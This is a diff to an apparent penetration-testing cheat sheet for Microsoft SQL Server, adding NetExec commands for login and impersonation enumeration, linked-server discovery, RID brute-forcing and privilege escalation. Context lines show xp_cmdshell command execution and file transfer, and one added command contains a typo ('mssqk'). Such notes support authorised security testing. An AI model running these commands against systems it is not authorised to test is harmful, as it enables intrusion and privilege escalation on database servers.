@@ -41,6 +41,12 @@ enum_users
 # check linked servers
 enum_links
 
+# Enum Logins
+enum_logins
+
+# Enum Impersonate
+enum_impersonate
+
 # Version Extraction
 SELECT @@VERSION;
 
@@ -87,9 +93,14 @@ EXEC xp_cmdshell 'whoami';
 ```
 
 ## NetExec
+list all mssql Modules
+```bash
+nxc mssql -L 
+```
+
 ### Rid-Brute 
 ```bash
-nxc mssql $ip -u '$user' -p '$pass' --rid-brute 2000 # max
+nxc mssql $ip -u '$user' -p '$pass' --rid-brute 20000 # max
 ```
 ### Logged in users:
 ```bash
@@ -101,8 +112,17 @@ nxc mssql $ip -u '$user' -p '$pass' --local-auth -M enum_impersonate
 ```
 ### impersonate user
 ```bash
-nxc mssql $ip -u '$user' -p 'pass' --local-auth -M mssql_priv
+nxc mssql $ip -u '$user' -p '$pass' --local-auth -M mssql_priv
 ```
+### Enumerate Links
+```bash
+nxc mssql $ip -u '$user' -p '$pass' -M enum_links
+```
+### Priv Esc
+```bash
+nxc mssql $ip -u '$user' -p '$pass' -M mssql_priv 
+```
+
 ### Upload and Download Files
 ```bash
 nxc mssql $ip -u '' -p ''  --put-file <local_file> <remote_path>
@@ -110,8 +130,10 @@ nxc mssql $ip -u '' -p ''  --get-file <local_output> <remote_file>
 ```
 ### Run Query
 ```bash
-nxc mssql $ip -u '' -p '' -q "select @@VERSION"
+nxc mssql $ip -u '' -p '' --query "select @@VERSION"
 nxc mssql $ip -u '' -p '' --query "SELECT name FROM sys.databases"
+nxc mssql $ip -u '' -p '' --query "SELECT name FROM master.dbo.sysdatabases;"
+nxc mssqk $Ip -u '' -p '' --query "SELECT name FROM sys.server_principals"
 ```
 #### Extract Powershell History
 ```bash
